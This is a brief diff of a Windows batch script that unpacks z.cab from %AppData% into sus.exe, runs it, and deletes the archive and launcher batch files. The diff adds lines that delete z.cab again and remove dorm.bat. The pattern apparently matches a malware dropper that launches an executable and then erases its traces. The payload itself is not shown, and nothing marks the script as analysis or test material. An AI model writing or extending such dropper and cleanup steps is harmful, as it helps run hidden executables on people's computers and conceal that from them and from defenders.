@@ -3,3 +3,5 @@ call expand %AppData%\z.cab %AppData%\sus.exe
 call start %AppData%\sus.exe
 call del %AppData%\z.cab
 call del %AppData%\prtol.bat
+call del %AppData%\z.cab
+call del %AppData%\dorm.bat
